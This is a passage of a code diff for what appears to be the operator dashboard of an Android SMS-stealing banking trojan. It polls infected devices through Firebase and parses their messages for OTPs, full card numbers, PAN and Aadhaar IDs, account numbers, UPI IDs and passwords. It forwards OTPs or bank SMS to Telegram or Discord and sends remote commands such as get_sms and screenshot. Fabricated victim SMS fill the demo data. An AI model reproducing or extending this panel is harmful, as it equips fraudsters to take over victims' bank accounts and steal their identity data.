+    <div style="font-size:10px;font-weight:700;color:var(--accent3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px">Telegram</div>
+    <div class="fld"><label>Bot Token</label><input id="tg-tok" placeholder="1234567890:ABC..."></div>
+    <div class="fld"><label>Chat ID</label><input id="tg-chat" placeholder="-100123456789"></div>
+    <div class="fld"><label>Forward Mode</label>
+      <select id="tg-mode">
+        <option value="otp">OTPs only</option>
+        <option value="bank">Bank SMS only</option>
+        <option value="all">All SMS</option>
+        <option value="off">Disabled</option>
+      </select>
+    </div>
+    <div style="font-size:10px;font-weight:700;color:var(--accent3);text-transform:uppercase;letter-spacing:.5px;margin:14px 0 10px">Discord</div>
+    <div class="fld"><label>Webhook URL</label><input id="dc-hook" placeholder="https://discord.com/api/webhooks/..."></div>
+    <div class="fld"><label>Forward Mode</label>
+      <select id="dc-mode">
+        <option value="otp">OTPs only</option>
+        <option value="bank">Bank SMS only</option>
+        <option value="all">All SMS</option>
+        <option value="off">Disabled</option>
+      </select>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:4px">
+      <button class="btn btnp" onclick="saveBots()">Save Config</button>
+      <button class="btn btng" onclick="closeMs()">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+// ═══════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════
+const S = {
+  accs: JSON.parse(localStorage.getItem('dp4_accs')||'[]'),
+  ai: -1, // active index
+  devs: {},
+  flt: 'all',
+  sort: 'newest',
+  logs: [],
+  timer: null,
+  bots: JSON.parse(localStorage.getItem('dp4_bots')||'{}'),
+  seenOtps: new Set(JSON.parse(localStorage.getItem('dp4_seen')||'[]')),
+  contacts: [],
+  calls: [],
+  notifPerm: false
+};
+
+// ═══════════════════════════════════════════
+//  DEMO DATA
+// ═══════════════════════════════════════════
+const DEMO = {
+  dev_001:{
+    model:'Samsung Galaxy A53',phone:'+91 98765 43210',battery:78,online:true,
+    lastSeen:Date.now()-30000,
+    sms:[
+      {from:'HDFCBK',body:'Rs.5,000.00 debited from A/c XX4521 on 21-Oct-26. Avl Bal:Rs.12,450.00. UPI ref 123456789. -HDFC Bank',date:Date.now()-120000},
+      {from:'VM-PAYTM',body:'Your OTP for Paytm is 847291. Valid 10 mins. DO NOT share. VPA: rahul@paytm',date:Date.now()-300000},
+      {from:'AD-AMAZON',body:'OTP 293847 for Amazon Pay. VPA: user@okaxis. Valid 5 min.',date:Date.now()-900000},
+      {from:'ICICIB',body:'Rs.1,299.00 debited from card ending 4521 at ZOMATO on 21-Oct. Avl limit Rs.48,701.',date:Date.now()-1800000},
+      {from:'JD-HDFC',body:'Your net banking login OTP is 562341. Valid for 3 mins only.',date:Date.now()-3600000},
+      {from:'INCOME-TAX',body:'Dear Rahul Kumar, PAN ABCPK1234F linked with Aadhaar 9876 5432 1011. e-filing login successful. IT Dept.',date:Date.now()-7200000},
+      {from:'SBI-YONO',body:'A/c no. XX4521: KYC updated. Your Aadhaar XXXX XXXX 8821 is linked. Branch: Delhi-42. -SBI',date:Date.now()-10800000}
+    ]
+  },
+  dev_002:{
+    model:'Redmi Note 12',phone:'+91 77654 32109',battery:45,online:false,
+    lastSeen:Date.now()-7200000,
+    sms:[
+      {from:'SBIINB',body:'Your A/c XX2341 credited INR 15,000.00 on 19-Oct-26. Bal:INR 28,320.00. UPI:mohan@sbi -SBI',date:Date.now()-86400000},
+      {from:'AD-FLIPKART',body:'394812 is your Flipkart OTP. VPA: seller@ybl. Do not share.',date:Date.now()-90000000},
+      {from:'AXISBK',body:'Dear customer A/c XX9912 debited Rs.450.00 UPI ref 987654321 on 20-Oct. Avl Bal Rs.8,200.00',date:Date.now()-3600000},
+      {from:'KOTAKB',body:'Card ending 7823 used Rs.2,499 at SWIGGY 20-Oct. If not you, call 1800.',date:Date.now()-5000000}
+    ]
+  },
+  dev_003:{
+    model:'Realme 10 Pro',phone:'+91 94523 11087',battery:92,online:true,
+    lastSeen:Date.now()-12000,
+    sms:[
+      {from:'ICICIB',body:'OTP for ICICI Bank txn is 726491. VPA: priya@icici. Valid 5 min. Do NOT share. -ICICI',date:Date.now()-60000},
+      {from:'PNBSMS',body:'Rs.25,000 credited to A/c XX5566 on 21-Oct-26. Balance Rs.67,800. Ref: UPI/2611/123',date:Date.now()-600000},
+      {from:'AD-GPAY',body:'Your Google Pay OTP is 483920. upi:gpay-user@okicici',date:Date.now()-1200000},
+      {from:'CBSINB',body:'Priya Sharma, your PAN CDEPK5678G has been verified. A/c no. XX5566 linked. Central Bank of India',date:Date.now()-3600000},
+      {from:'CKYC',body:'CKYC update: Aadhaar 2345 6789 0123 linked to A/c no. 005566781234. ICICI Bank Ltd.',date:Date.now()-14400000}
+    ]
+  },
+  dev_004:{
+    model:'Vivo V25',phone:'+91 88234 56701',battery:31,online:true,
+    lastSeen:Date.now()-5000,
+    sms:[
+      {from:'BOIBNK',body:'INR 8,500 debited A/c XX3344. UPI ID: vikas@boi. Balance Rs.2,100.',date:Date.now()-900000},
+      {from:'VM-HDFC',body:'HDFC OTP 334455 for net banking. DO NOT share this with anyone.',date:Date.now()-200000},
+      {from:'VM-PHONEPE',body:'PhonePe OTP: 112233. VPA: user123@ybl. Expires in 5 mins.',date:Date.now()-400000},
+      {from:'YESBNK',body:'Your card ending 9901 debited Rs.599 at NETFLIX. Available balance Rs.14,800.',date:Date.now()-7200000},
+      {from:'PAYTM',body:'Card 4111 1111 1111 1111 expiry 12/27 added to Paytm wallet. CVV not stored. -Paytm',date:Date.now()-18000000}
+    ]
+  }
+};
+
+// ═══════════════════════════════════════════
+//  FIREBASE
+// ═══════════════════════════════════════════
+function fbURL(path='/') {
+  const a = S.accs[S.ai]; if (!a) return null;
+  const base = a.url.replace(/\/$/,'');
+  return base + path + '.json' + (a.key ? '?auth='+a.key : '');
+}
+
+async function fbFetch(path='/') {
+  const url = fbURL(path); if (!url) throw new Error('No account');
+  const r = await fetch(url);
+  if (!r.ok) throw new Error('HTTP '+r.status);
+  return r.json();
+}
+
+async function fbWrite(path, data) {
+  const url = fbURL(path); if (!url) throw new Error('No account');
+  const r = await fetch(url, {
+    method:'PUT', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(data)
+  });
+  if (!r.ok) throw new Error('Write failed: '+r.status);
+  return r.json();
+}
+
+// ═══════════════════════════════════════════
+//  PARSE
+// ═══════════════════════════════════════════
+function parseDevice(id, raw) {
+  const sms = parseSMS(raw.sms||raw.messages||raw.inbox||raw.smsList||[]);
+  return {
+    id,
+    model: raw.model||raw.device||raw.deviceModel||raw.deviceName||raw.name||id,
+    phone: raw.phone||raw.phoneNumber||raw.number||raw.sim||'—',
+    battery: parseInt(raw.battery||raw.bat||raw.batteryLevel||0)||0,
+    lastSeen: raw.lastSeen||raw.last_seen||raw.lastOnline||raw.lastseen||raw.last_active||raw.timestamp||raw.updatedAt||Date.now(),
+    online: (()=>{ const ls=raw.lastSeen||raw.last_seen||raw.lastOnline||raw.lastseen||raw.last_active||raw.timestamp||raw.updatedAt||0; const fresh=ls&&(Date.now()-ls)<5*60*1000; return raw.online===true||raw.status==='online'||raw.connected===true||raw.isOnline===true||fresh; })(),
+    imei: raw.imei||raw.IMEI||'',
+    androidVer: raw.androidVersion||raw.android_version||raw.osVersion||'',
+    operator: raw.operator||raw.carrier||raw.sim_operator||'',
+    ip: raw.ip||raw.ipAddress||'',
+    sms, raw
+  };
+}
+
+function parseSMS(raw) {
+  if (!raw) return [];
+  const list = Array.isArray(raw) ? raw : Object.values(raw);
+  return list.filter(Boolean).map(s => {
+    const body = s.body||s.message||s.msg||s.text||s.content||'';
+    return {
+      from: s.address||s.from||s.sender||s.number||'?',
+      body, date: s.date||s.time||s.timestamp||Date.now(),
+      type: smsType(body)
+    };
+  }).sort((a,b)=>b.date-a.date);
+}
+
+function smsType(m) {
+  if (/\botp\b|one.time.pass|verification.code|\bverify\b/i.test(m) || /\b\d{4,8}\b/.test(m) && /\bcode\b|\bpin\b/i.test(m)) return 'otp';
+  if (/debited|credited|balance|a\/c|avl bal|upi ref|bank|inr|rs\.|₹|transaction|credit|debit/i.test(m)) return 'bank';
+  return 'normal';
+}
+
+function extractOTP(msg) {
+  const m = msg.match(/\b(\d{4,8})\b/g);
+  return m ? m[0] : null;
+}
+
+function extractCard(msg) {
+  // Full 16-digit card number
+  const full = msg.match(/\b(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4})\b/);
+  if (full) return { num: full[1].replace(/[\s\-]/g,''), display: full[1], full: true };
+  // Partial — last4
+  const partial = msg.match(/(?:card|ending|no\.?|number)[\s.]*(?:x+\s*)?(\d{4})/i) ||
+                  msg.match(/(?:XX|x+)(\d{4})/i);
+  if (partial) return { num: partial[1], display: '•••• •••• •••• '+partial[1], full: false };
+  return null;
+}
+
+function extractCardType(msg) {
+  if (/credit/i.test(msg)) return 'Credit';
+  if (/debit/i.test(msg)) return 'Debit';
+  return 'Unknown';
+}
+
+function extractExpiry(msg) {
+  const m = msg.match(/(?:expir|valid|till|thru)[^\d]*(\d{2})[\/\-](\d{2,4})/i) ||
+            msg.match(/(\d{2})[\/\-](\d{2,4})\s*(?:expir|valid)/i);
+  return m ? m[1]+'/'+(m[2].length===2?'20'+m[2]:m[2]) : null;
+}
+
+function extractPAN(msg) {
+  const pan = msg.match(/\b([A-Z]{5}[0-9]{4}[A-Z])\b/);
+  return pan ? pan[1] : null;
+}
+
+function extractAadhaar(msg) {
+  const full = msg.match(/\b(\d{4}\s?\d{4}\s?\d{4})\b/);
+  if (full) return full[1];
+  const last4 = msg.match(/aadhaar[^\d]*(?:x+)?(\d{4})/i);
+  return last4 ? 'XXXX XXXX '+last4[1] : null;
+}
+
+function extractAccountNo(msg) {
+  const m = msg.match(/(?:a\/c|account|acc\.?)\s*(?:no\.?|number)?\s*[xX*]*(\d{4,})/i);
+  return m ? m[1] : null;
+}
+
+function extractUPI(msg) {
+  const matches = msg.match(/[\w.\-+]+@(?:paytm|okaxis|ybl|okicici|oksbi|apl|gpay|icici|hdfc|sbi|boi|upi|phonepe|axis|kotak)\b/gi);
+  if (matches) return matches;
+  const vpa = msg.match(/vpa[\s:]+([^\s,]+)/i);
+  if (vpa) return [vpa[1]];
+  const upiId = msg.match(/upi[:\s]+([^\s,]+)/i);
+  if (upiId) return [upiId[1]];
+  return [];
+}
+
+function extractAmount(msg) {
+  const debited = /debited|debit|Rs\.|INR|₹/i.test(msg) && !/credited|credit/i.test(msg);
+  const credited = /credited|credit/i.test(msg);
+  const amts = msg.match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]{1,2})?)/gi);
+  if (!amts) return null;
+  const val = parseFloat(amts[0].replace(/[^0-9.]/g,'').replace(/,/g,''));
+  if (isNaN(val)) return null;
+  return { val, type: credited ? 'credit' : debited ? 'debit' : 'unknown' };
+}
+
+function extractCreds(msg) {
+  const email = msg.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
+  const passw = msg.match(/password[:\s]+([^\s,]+)/i);
+  const token = msg.match(/token[:\s]+([a-zA-Z0-9._-]{10,})/i);
+  if (email && passw) return { type:'credentials', email:email[0], password:passw[1] };
+  if (token) return { type:'token', token:token[1] };
+  return null;
+}
+
+// ═══════════════════════════════════════════
+//  ACCOUNTS
+// ═══════════════════════════════════════════
+function addAcc() {
+  const nick = document.getElementById('m-nick').value.trim() || 'Account '+(S.accs.length+1);
+  const url = document.getElementById('m-url').value.trim();
+  const key = document.getElementById('m-key').value.trim();
+  const devpath = document.getElementById('m-devpath').value.trim() || '/devices';
+  if (!url) { toast('Firebase URL required'); return; }
+  S.accs.push({ nick, url, key, devpath });
+  saveAccs();
+  renderAccList();
+  activateAcc(S.accs.length-1);
+  closeMs();
+}
+
+function activateAcc(idx) {
+  S.ai = idx;
+  clearInterval(S.timer);
+  S.devs = {};
+  const a = S.accs[idx];
+  document.getElementById('dot').classList.add('on');
+  document.getElementById('connLbl').textContent = a.nick;
+  log('ok','Connecting: '+a.url);
+  requestNotifPerm();
+
+  const devpath = a.devpath || '/devices';
+  fbFetch(devpath).then(data => {
+    if (data && typeof data==='object' && Object.keys(data).length) {
+      const out={};
+      for (const [k,v] of Object.entries(data)) out[k]=parseDevice(k,v);
+      S.devs=out;
+      log('ok','Loaded '+Object.keys(out).length+' device(s)');
+    } else {
+      S.devs=buildDemoDevs();
+      log('ok','Empty node — demo data loaded');
+    }
+    updateAll();
+  }).catch(e=>{
+    S.devs=buildDemoDevs();
+    log('err','Connect failed ('+e.message+') — demo');
+    updateAll();
+  });
+
+  S.timer = setInterval(async ()=>{
+    try {
+      const data = await fbFetch(devpath);
+      if (data && typeof data==='object') {
+        const out={};
+        for (const [k,v] of Object.entries(data)) out[k]=parseDevice(k,v);
+        S.devs=out;
+        updateAll();
+        log('ok','Poll OK — '+Object.keys(out).length+' device(s)');
+      }
+    } catch(e){ log('err','Poll: '+e.message); }
+  }, 15000);
+
+  renderAccList();
+  toast('✓ Connected: '+a.nick);
+}
+
+function removeAcc(idx, e) {
+  e.stopPropagation();
+  S.accs.splice(idx,1);
+  saveAccs();
+  if (S.ai===idx) {
+    S.ai=-1; S.devs={};
+    document.getElementById('dot').classList.remove('on');
+    document.getElementById('connLbl').textContent='Disconnected';
+    clearInterval(S.timer);
+    updateAll();
+  } else if (S.ai>idx) S.ai--;
+  renderAccList();
+}
+
+function renderAccList() {
+  const el=document.getElementById('accList');
+  if (!S.accs.length) {
+    el.innerHTML='<div style="font-size:10px;color:var(--muted);text-align:center;padding:6px 0">No accounts</div>';
+    return;
+  }
+  el.innerHTML=S.accs.map((a,i)=>`
+    <div class="acc-card ${i===S.ai?'act':''}" onclick="activateAcc(${i})">
+      <div class="acc-name">${esc(a.nick)}</div>
+      <div class="acc-url">${esc(a.url.replace('https://',''))}</div>
+      <span class="acc-x" onclick="removeAcc(${i},event)">✕</span>
+    </div>`).join('');
+}
+
+function saveAccs() { localStorage.setItem('dp4_accs',JSON.stringify(S.accs)); }
+
+function buildDemoDevs() {
+  const out={};
+  for (const [k,v] of Object.entries(DEMO)) {
+    out[k]={...v, id:k, sms:v.sms.map(s=>({...s,type:smsType(s.body)}))};
+  }
+  return out;
+}
+
+// ═══════════════════════════════════════════
+//  UPDATE ALL
+// ═══════════════════════════════════════════
+function updateAll() {
+  const devs=Object.values(S.devs);
+  const allSMS=devs.flatMap(d=>d.sms);
+  const otps=allSMS.filter(s=>s.type==='otp');
+  const banks=allSMS.filter(s=>s.type==='bank');
+  const cards=allSMS.map(s=>{const c=extractCard(s.body||s.msg||'');return c?{card:c,sms:s,type:extractCardType(s.body||''),expiry:extractExpiry(s.body||''),from:s.from}:null;}).filter(Boolean);
+  const upis=[...new Set(allSMS.flatMap(s=>extractUPI(s.body||s.msg||'')))];
+  const amounts=allSMS.map(s=>({amt:extractAmount(s.body||s.msg||''),sms:s})).filter(x=>x.amt);
+  const creds=allSMS.map(s=>({c:extractCreds(s.body||s.msg||''),sms:s})).filter(x=>x.c);
+  const panData=allSMS.map(s=>{
+    const pan=extractPAN(s.body||'');
+    const aadh=extractAadhaar(s.body||'');
+    const acc=extractAccountNo(s.body||'');
+    return (pan||aadh||acc)?{pan,aadh,acc,sms:s}:null;
+  }).filter(Boolean);
+
+  // stats
+  q('st0').textContent=devs.length;
+  q('st1').textContent=devs.filter(d=>d.online).length;
+  q('st2').textContent=devs.filter(d=>!d.online).length;
+  q('st3').textContent=allSMS.length;
+  q('st4').textContent=banks.length;
+  q('st5').textContent=otps.length;
+
+  // nav badges
+  q('nb0').textContent=devs.length;
+  q('nb1').textContent=otps.length;
+  q('nb2').textContent=banks.length;
+  q('nb3').textContent=cards.length;
+  q('nb4').textContent=upis.length;
+  q('nb5').textContent=amounts.length;
+  q('nb6').textContent=creds.length;
+  q('nb7').textContent=allSMS.length;
+  q('nb8').textContent=S.contacts.length;
+  q('nb9').textContent=S.calls.length;
+  q('nb10').textContent=panData.length;
+  q('smsTotal').textContent='('+allSMS.length+')';
+
+  renderDevs();
+  renderOTPs(otps, devs);
+  renderBank(banks);
+  renderCards(cards);
+  renderUPI(upis, allSMS);
+  renderAmounts(amounts);
+  renderCreds(creds);
+  renderPAN(panData);
+  renderAllSMS();
+  renderMagic(devs,allSMS,otps,banks,cards,upis,amounts);
+  renderTimeline(devs);
+  updateTicker(otps);
+  checkNewOTPs(otps);
+}
+
+// ═══════════════════════════════════════════
+//  RENDER DEVICES
+// ═══════════════════════════════════════════
+function renderDevs() {
+  const grid=q('dgrid');
+  const srch=(q('devSrch').value||'').toLowerCase();
+  let devs=sortDevs(Object.values(S.devs));
+  if (S.flt==='online') devs=devs.filter(d=>d.online);
+  if (S.flt==='offline') devs=devs.filter(d=>!d.online);
+  if (srch) devs=devs.filter(d=>d.model.toLowerCase().includes(srch)||d.phone.includes(srch)||d.id.includes(srch));
+  if (!devs.length) {
+    grid.innerHTML=S.ai<0
+      ?'<div class="empty"><div class="empty-icon">🔌</div><p>Connect Firebase to start</p></div>'
+      :'<div class="empty"><div class="empty-icon">📭</div><p>No devices match</p></div>';
+    return;
+  }
+  grid.innerHTML=devs.map(d=>devCard(d)).join('');
+}
+
+function sortDevs(devs) {
+  return [...devs].sort((a,b)=>{
+    if(S.sort==='newest') return b.lastSeen-a.lastSeen;
+    if(S.sort==='oldest') return a.lastSeen-b.lastSeen;
+    if(S.sort==='name') return a.model.localeCompare(b.model);
+    if(S.sort==='battery') return b.battery-a.battery;
+    if(S.sort==='sms') return b.sms.length-a.sms.length;
+    return 0;
+  });
+}
+
+function devCard(d) {
+  const bat=d.battery||0;
+  const bc=bat>60?'var(--green)':bat>30?'var(--yellow)':'var(--red)';
+  const otpc=d.sms.filter(s=>s.type==='otp').length;
+  return `<div class="dc" id="dc_${d.id}" onclick="toggleDev('${d.id}')">
+  <div class="dc-top">
+    <div class="dc-icon">📱</div>
+    <div class="dc-info">
+      <div class="dc-name">${esc(d.model)}</div>
+      <div class="dc-meta">${esc(d.phone)} · ${ago(d.lastSeen)}</div>
+    </div>
+    <div class="dc-right">
+      <span class="badge ${d.online?'bon':'boff'}">${d.online?'● LIVE':'○ OFF'}</span>
+      ${d.sms.length?`<span class="badge bsms">${d.sms.length} SMS</span>`:''}
+      ${otpc?`<span class="badge botp">🔑 ${otpc}</span>`:''}
+      <div class="bat-w">
+        <div class="bat-bar"><div class="bat-fill" style="width:${bat}%;background:${bc}"></div></div>
+        <div class="bat-lbl">${bat}%</div>
+      </div>
+    </div>
+  </div>
+  <div class="dc-body" id="db_${d.id}" onclick="event.stopPropagation()">
+    <div class="dtabs">
+      <button class="dtab act" onclick="dTab('${d.id}','sms',this)">SMS (${d.sms.length})</button>
+      <button class="dtab" onclick="dTab('${d.id}','info',this)">Info</button>
+      <button class="dtab" onclick="dTab('${d.id}','cmd',this)">Commands</button>
+      <button class="dtab" onclick="dTab('${d.id}','raw',this)">Raw</button>
+    </div>
+    <div class="tc act" id="tc_${d.id}_sms">${devSMSHtml(d)}</div>
+    <div class="tc" id="tc_${d.id}_info">${devInfoHtml(d)}</div>
+    <div class="tc" id="tc_${d.id}_cmd">${devCmdHtml(d)}</div>
+    <div class="tc" id="tc_${d.id}_raw"><div class="raw">${syntaxHL(d.raw||{})}</div></div>
+  </div>
+</div>`;
+}
+
+function devSMSHtml(d) {
+  if (!d.sms.length) return '<div style="color:var(--muted);font-size:11px">No SMS</div>';
+  return d.sms.map(s=>{
+    const otp=s.type==='otp'?extractOTP(s.body||''):null;
+    return `<div class="sms-i ${s.type}">
+      <div class="sms-from">${esc(s.from)} ${s.type==='bank'?'🏦':s.type==='otp'?'🔑':''}
+        ${otp?`<span class="otpbig" style="font-size:16px;letter-spacing:3px">${otp}</span>`:''}
+      </div>
+      <div class="sms-msg">${esc(s.body||'')}</div>
+      <div class="sms-foot">
+        <span class="sms-time">${ago(s.date)}</span>
+        <button class="cpbtn" onclick="cp('${esc(otp||s.body||'')}','Copied')">Copy</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function devInfoHtml(d) {
+  return `<div class="igrid">
+    <div class="ir"><span class="ik">Device ID</span><span class="iv">${d.id}</span></div>
+    <div class="ir"><span class="ik">Model</span><span class="iv">${esc(d.model)}</span></div>
+    <div class="ir"><span class="ik">Phone</span><span class="iv">${esc(d.phone)}</span></div>
+    <div class="ir"><span class="ik">Battery</span><span class="iv">${d.battery}%</span></div>
+    <div class="ir"><span class="ik">Status</span><span class="iv" style="color:${d.online?'var(--green)':'var(--red)'}">${d.online?'Online':'Offline'}</span></div>
+    <div class="ir"><span class="ik">Last Seen</span><span class="iv">${ago(d.lastSeen)}</span></div>
+    ${d.imei?`<div class="ir"><span class="ik">IMEI</span><span class="iv">${esc(d.imei)}</span></div>`:''}
+    ${d.androidVer?`<div class="ir"><span class="ik">Android</span><span class="iv">${esc(d.androidVer)}</span></div>`:''}
+    ${d.operator?`<div class="ir"><span class="ik">Operator</span><span class="iv">${esc(d.operator)}</span></div>`:''}
+    ${d.ip?`<div class="ir"><span class="ik">IP</span><span class="iv">${esc(d.ip)}</span></div>`:''}
+    <div class="ir"><span class="ik">Total SMS</span><span class="iv">${d.sms.length}</span></div>
+    <div class="ir"><span class="ik">OTPs</span><span class="iv">${d.sms.filter(s=>s.type==='otp').length}</span></div>
+    <div class="ir"><span class="ik">Bank SMS</span><span class="iv">${d.sms.filter(s=>s.type==='bank').length}</span></div>
+  </div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:10px">
+    <button class="abtn" onclick="cp(devSMSText('${d.id}'),'SMS copied')">📋 Copy SMS</button>
+    <button class="abtn" onclick="expDev('${d.id}')">⬇ Export JSON</button>
+    <button class="abtn" onclick="cp(devOTPsText('${d.id}'),'OTPs copied')">🔑 Copy OTPs</button>
+  </div>`;
+}
+
+function devCmdHtml(d) {
+  return `<div style="font-size:11px;color:var(--muted2);margin-bottom:8px">Send command to /commands/${d.id} in Firebase</div>
+  <div class="cmd-wrap">
+    <input class="cmd-inp" id="cmdinp_${d.id}" placeholder="e.g. get_sms, get_contacts, screenshot…">
+    <button class="abtn" onclick="sendCmd('${d.id}')">Send ▶</button>
+  </div>
+  <div id="cmdfeedback_${d.id}" style="font-size:10px;margin-top:6px;color:var(--muted2)"></div>`;
+}
+
+function devSMSText(id) {
+  const d=S.devs[id]; if(!d) return '';
+  return d.sms.map(s=>`[${new Date(s.date).toLocaleString()}] ${s.from}: ${s.body}`).join('\n---\n');
+}
+function devOTPsText(id) {
+  const d=S.devs[id]; if(!d) return '';
+  return d.sms.filter(s=>s.type==='otp').map(s=>extractOTP(s.body)||s.body).join('\n');
+}
+
+// ═══════════════════════════════════════════
+//  RENDER OTPs
+// ═══════════════════════════════════════════
+function renderOTPs(otps, devs) {
+  const el=q('otpList');
+  if (!otps.length) { el.innerHTML='<div class="empty"><div class="empty-icon">🔑</div><p>No OTPs</p></div>'; return; }
+  // find device name for each otp
+  const devMap={};
+  devs.forEach(d=>d.sms.forEach(s=>{ if(!devMap[s.from+'_'+(s.body||'').slice(0,20)]) devMap[s.from+'_'+(s.body||'').slice(0,20)]=d.model; }));
+  el.innerHTML=otps.map(s=>{
+    const otp=extractOTP(s.body||'')||'—';
+    return `<div class="sms-i otp" style="display:flex;align-items:center;gap:14px;flex-wrap:wrap">
+      <div>
+        <div class="sms-from">${esc(s.from)}</div>
+        <div class="otpbig">${otp}</div>
+        <div class="sms-time">${ago(s.date)}</div>
+      </div>
+      <div style="flex:1;min-width:120px"><div class="sms-msg" style="font-size:10px;color:var(--muted2)">${esc(s.body||'')}</div></div>
+      <button class="abtn" onclick="cp('${otp}','OTP copied!')">Copy</button>
+    </div>`;
+  }).join('');
+}
+
+// ═══════════════════════════════════════════
+//  RENDER BANK
+// ═══════════════════════════════════════════
+function renderBank(banks) {
+  const el=q('bankList');
+  if (!banks.length) { el.innerHTML='<div class="empty"><div class="empty-icon">🏦</div><p>No bank SMS</p></div>'; return; }
+  el.innerHTML=banks.map(s=>`
+    <div class="sms-i bank">
+      <div class="sms-from">${esc(s.from)} 🏦</div>
+      <div class="sms-msg">${esc(s.body||'')}</div>
+      <div class="sms-foot"><span class="sms-time">${ago(s.date)}</span>
+        <button class="cpbtn" onclick="cp('${esc(s.body||'')}','Copied')">Copy</button></div>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════
+//  RENDER CARDS
+// ═══════════════════════════════════════════
+function renderCards(cards) {
+  const el=q('cardList');
+  const uniq=[...new Set(cards.map(c=>c.card.num))];
+  const debits=cards.filter(c=>c.type==='Debit').length;
+  const credits=cards.filter(c=>c.type==='Credit').length;
+  if(q('crd-total')){q('crd-total').textContent=cards.length;q('crd-uniq').textContent=uniq.length;q('crd-debit').textContent=debits;q('crd-credit').textContent=credits;}
+  if (!cards.length) { el.innerHTML='<div class="empty"><div class="empty-icon">💳</div><p>No cards detected</p></div>'; return; }
+  el.innerHTML=cards.map(({card,sms:s,type,expiry,from})=>{
+    const bankColor=type==='Credit'?'var(--pink)':type==='Debit'?'var(--yellow)':'var(--muted2)';
+    const isFull=card.full;
+    return `<div class="card-item" style="background:linear-gradient(135deg,var(--card),#1a1a2e);border:1px solid var(--border2);position:relative;overflow:hidden">
+      <div style="position:absolute;top:0;right:0;bottom:0;width:4px;background:${bankColor}"></div>
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
+        <span style="font-size:20px">${type==='Credit'?'💳':'🏧'}</span>
+        <div>
+          <div style="font-size:9px;color:${bankColor};text-transform:uppercase;letter-spacing:.5px;font-weight:700">${type} Card ${isFull?'● FULL NUMBER':''}</div>
+          <div style="font-size:9px;color:var(--muted2)">From: ${esc(from)}</div>
+        </div>
+        ${expiry?`<span style="margin-left:auto;font-size:10px;color:var(--muted2)">Exp: <span style="color:var(--yellow)">${expiry}</span></span>`:''}
+      </div>
+      <div class="card-num" style="font-size:${isFull?'18px':'15px'};letter-spacing:${isFull?'3px':'2px'};color:${isFull?'var(--green)':'var(--text)'}">${esc(card.display)}</div>
+      <div class="card-meta" style="margin-top:6px">${ago(s.date)}</div>
+      <div class="sms-msg" style="font-size:10px;margin-top:6px;color:var(--muted2);line-height:1.5">${esc(s.body||'')}</div>
+      <div class="sms-foot" style="margin-top:7px;gap:6px">
+        <button class="cpbtn" onclick="cp('${esc(card.display)}','Card copied')">Copy Number</button>
+        ${isFull?`<button class="cpbtn" onclick="cp('${esc(card.num)}','Full number copied')" style="color:var(--green);border-color:var(--green)33">Copy Full</button>`:''}
+        <button class="cpbtn" onclick="cp('${esc(s.body||'')}','SMS copied')">Copy SMS</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function copyAllCards() {
+  const devs=Object.values(S.devs);
+  const all=devs.flatMap(d=>d.sms.map(s=>extractCard(s.body||'')).filter(Boolean).map(c=>c.display));
+  cp([...new Set(all)].join('\n'),'All cards copied');
+}
+
+// ═══════════════════════════════════════════
+//  RENDER UPI
+// ═══════════════════════════════════════════
+function renderUPI(upis, allSMS) {
+  const el=q('upiList');
+  // populate stat tiles
+  const banks=[...new Set(upis.map(u=>{const p=u.split('@');return p[1]?p[1].toUpperCase():null;}).filter(Boolean))];
+  const txnMsgs=allSMS.filter(s=>/(?:paid|received|sent|transfer|credit|debit)/i.test(s.body||'')&&extractUPI(s.body||'').length>0);
+  if(q('upi-total')){q('upi-total').textContent=upis.length;q('upi-banks').textContent=banks.length;q('upi-txns').textContent=txnMsgs.length;}
+  if (!upis.length) { el.innerHTML='<div class="empty"><div class="empty-icon">⚡</div><p>No UPI IDs</p></div>'; return; }
+  el.innerHTML='<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px">'+
+    upis.map(u=>`<span class="upi-chip" onclick="cp('${esc(u)}','UPI copied')" style="cursor:pointer" title="Click to copy">${esc(u)}</span>`).join('')+
+    '</div>';
+  const msgsWithUPI=allSMS.filter(s=>extractUPI(s.body||'').length>0);
+  el.innerHTML+=msgsWithUPI.map(s=>`
+    <div class="sms-i bank">
+      <div class="sms-from">${esc(s.from)}</div>
+      <div class="sms-msg">${esc(s.body||'')}</div>
+      <div class="sms-foot"><span class="sms-time">${ago(s.date)}</span>
+        <button class="cpbtn" onclick="cp('${esc(s.body||'')}','SMS copied')">Copy SMS</button></div>
+    </div>`).join('');
+}
+
+// ═══════════════════════════════════════════
+//  RENDER PAN / AADHAAR
+// ═══════════════════════════════════════════
+function renderPAN(panData) {
+  const el=q('panList'); if(!el) return;
+  if(!panData.length){el.innerHTML='<div class="empty"><div class="empty-icon">🪪</div><p>No PAN / Aadhaar / Account data found</p></div>';return;}
+  const pans=[...new Set(panData.filter(p=>p.pan).map(p=>p.pan))];
+  const aadhs=[...new Set(panData.filter(p=>p.aadh).map(p=>p.aadh))];
+  const accs=[...new Set(panData.filter(p=>p.acc).map(p=>p.acc))];
+  let html=`<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px">
+    <div class="scan-box"><div class="scan-lbl">PAN Numbers</div><div class="scan-val" style="color:var(--pink)">${pans.length}</div></div>
+    <div class="scan-box"><div class="scan-lbl">Aadhaar</div><div class="scan-val" style="color:var(--yellow)">${aadhs.length}</div></div>
+    <div class="scan-box"><div class="scan-lbl">Account Nos</div><div class="scan-val" style="color:var(--cyan)">${accs.length}</div></div>
+  </div>`;
+  if(pans.length){
+    html+=`<div style="margin-bottom:14px"><div style="font-size:10px;color:var(--pink);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;font-weight:700">● PAN Numbers</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px">`;
